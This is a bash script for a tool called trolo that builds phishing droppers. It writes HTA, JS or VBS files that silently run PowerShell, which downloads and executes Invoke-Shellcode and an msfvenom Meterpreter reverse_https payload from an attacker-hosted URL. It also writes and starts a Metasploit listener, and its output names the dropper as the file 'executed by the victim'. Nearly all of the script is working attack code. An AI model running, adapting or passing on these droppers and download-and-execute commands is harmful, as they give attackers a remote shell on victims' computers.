#!/bin/bash

while getopts ":i:p:f:n:a:g:q:u" opt; do
	case $opt in
		i)
			yourIp=$OPTARG   ##LOCAL HOST IP
		;;
		p)
			yourPort=$OPTARG   ##LOCAL HOST PORT
		;;
		f)
			format=$OPTARG   ##PAYLOAD FORMAT (HTA,JS,VBS,CUSTOM)
		;;
		n)
			pshName=$OPTARG   ##PAYLOAD NAME
		;;
		a)
			pshArch=$OPTARG     ##ARCHITECTURE x86 OR x64
		;;
		g)
			pshGrab=$OPTARG   ##POWERSHELL GRAB TXT
		;;
		q)
			pshInv=$OPTARG   ##INVOKE SHELLCODE
		;;
		u)
			wget "https://raw.githubusercontent.com/b3rito/trolo/master/trolo.sh" -O trolo.sh
			exit
		;;
		\?)
			echo "Invalid option: $OPTARG"
			exit
		;;
	esac
done


if [ $OPTIND -eq 1 ]; then
	echo -e "\e[1;94m================================================================================\e[m"
		cat << "img"
                           +(\           
                  ______ +/  .|   _____  ____  ____  _     ____
             >== '|     b3  \_|  /__ __\/  __\/  _ \/ \   /  _ \
               /  |trust| \/       / \  |  \/|| / \|| |   | / \|
               |_ | me  |__|       | |  |    /| \_/|| |_/\| \_/|
              (  )|_____(  )       \_/  \_/\_\\____/\____/\____/
              (__)      (__)         KEEPING IT SIMPLE!   v1.0
img
	echo -e "\e[1;94m================================================================================\e[m"
cat << EOL
https://github.com/b3rito/trolo
Usage: ./trolo.sh -i [IP] -p [PORT] -n [NAME] -f [FORMAT] -a [ARCH. x86/x64]

  -i:	Local host IP address
  -p:	Local host port number (default: 443)
  -n:	Output file name (default: PAYLOAD)
  -a:   Architecture x86/x64 (default: x64)
  -f:   Output format: hta, js, vbs, custom
  -g:   Enter the full URL where powershell grabs the txt file from
        (default: "http://YourIp/FileName.txt")
  -q:   Enter alternative URL where powershell grabs Invoke-Shellcode.ps1 from
  -u:   Update

EOL

read -p "insert your IP: " yourIp
read -p "insert port (default: 443): " yourPort
read -p "payload name (default: PAYLOAD): " pshName
read -p "specify payload architecture [x86 or (x64)]: " pshArch
read -p "enter the full URL where powershell grabs the txt file from (default: "http://$192.168.56.1/$pshName.txt"): " pshGrab
read -p "enter alternative URL where powershell grabs Invoke-Shellcode.ps1 from (press Enter for default: github): " pshInv
read -p "insert format [hta/js/vbs/custom]: " format
fi
#DEFAULT PORT 443
if [ -z $yourPort ]; then
		yourPort=445
fi
#DEFAULT PAYLOAD
if [ -z $pshName ]; then
		pshName=PAYLOAD
fi
#DEFAULT ARCHITECTURE x64
if [ -z $pshArch ]; then
		pshArch=x64
fi
#DEFAULT GRAB
if [ -z $pshGrab ]; then
	pshGrab=$(echo "http://$192.168.56.1/$pshName.txt")
else
	echo $pshGrab
fi
#DEFAULT INVOKE
if [ -z $pshInv ]; then
	pshInv=$(echo "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1")
else
	echo $pshInv
fi

#POWERSHELL COMMANDS
pshCmd="powershell.exe -nop -win Hidden -noni -command IEX (New-Object Net.WebClient).DownloadString('$pshInv'); IEX (New-Object Net.WebClient).DownloadString('$pshGrab'); Invoke-Shellcode -Shellcode @(\$buf) -Force"

if [[ -z $format ]]; then
	read -p "format not entered, enter format (hta,js,vbs,custom): " format
	if [[ -z $format ]]; then
		echo "FORMAT NOT FOUND">&2
		exit 1
	fi
fi
#HTA
if [ $format = hta ]; then
	cat > $pshName.hta << EOL
	<html>
	<head>
		<script language="VBScript">
		Set objShell = CreateObject("Wscript.Shell")
		objShell.Run "$pshCmd", 0
		</script>
	</head>
	<body>
	<!-- info -->
	</body>
	</html>
EOL
	fileExt=$(echo "hta")
#JS
elif [ $format = js ]; then
	cat > $pshName.js << EOL
	var objShell = new ActiveXObject("WScript.shell");
	objShell.run("$pshCmd", 0);
EOL
	fileExt=$(echo "js")
#VBS
elif [ $format = vbs ]; then
	cat > $pshName.vbs << EOL
	Set objShell = CreateObject("Wscript.Shell") : objShell.Run "$pshCmd", 0
EOL
	fileExt=$(echo "vbs")
#CUSTOM
elif [ $format = custom ]; then
	echo "don't forget to insert 'pshCmd' in your script "
	read -p "enter path to custom file: " filePath
	read -p "enter file extention (like vbs): " fileExt
	sed "s!pshCmd!$pshCmd!" "$filePath" > $pshName.$fileExt
else
	echo "FORMAT NOT FOUND">&2
	exit 1
fi

#PAYLOAD ARCHITECTURE

if [ -z $pshArch ]; then
	read -p "specify architecture (x86/x64): " pshArch
fi

if [[ $pshArch = "x86" ]]; then
	pshArch=$(echo "windows/meterpreter/reverse_https")
	pshArch1=$(echo "-a x86")
elif [[ $pshArch = "x64" ]]; then
	pshArch=$(echo "windows/x64/meterpreter/reverse_https")
	pshArch1=$(echo "-a x64")
else
	echo "ARCHITECTURE NOT FOUND">&2
	exit 1
fi

#GENERATE POWERHELL SCRIPT TO LOAD ON LOCAL HOST
msfvenom -p $pshArch $pshArch1 LHOST=$yourIp LPORT=$yourPort -f powershell > $pshName.txt

echo -e "\e[1;93m================================================================================\e[m"
pwd=$(pwd)
cat << EOL
Three files where created in $pwd :
$pshName.$fileExt >>> is the file that will be sent and executed by the victim
$pshName.rc >>> is used for metasploit
$pshName.txt >> must be uploaded here: $pshGrab
EOL
echo -e "\e[1;93m================================================================================\e[m"


#METASPLOIT HANDLER
cat > $pshName.rc << EOL
use exploit/multi/handler
set PAYLOAD $pshArch
set LHOST $yourIp
set LPORT $yourPort
set ExitOnSession false
set enablecontextencoding true
set enablestageencoding true
set enableunicodeencoding true
exploit -j
EOL


#START METASPLOIT ON HOST
read -p "Would you like me to start metasploit for you? (yes/NO) " msfStart
if [ "$msfStart" == "yes" ] || [ "$msfStart" == "Y" ] || [ "$msfStart" == "y" ]; then
	msfconsole -r $pshName.rc
else
	echo "enjoy!"
fi
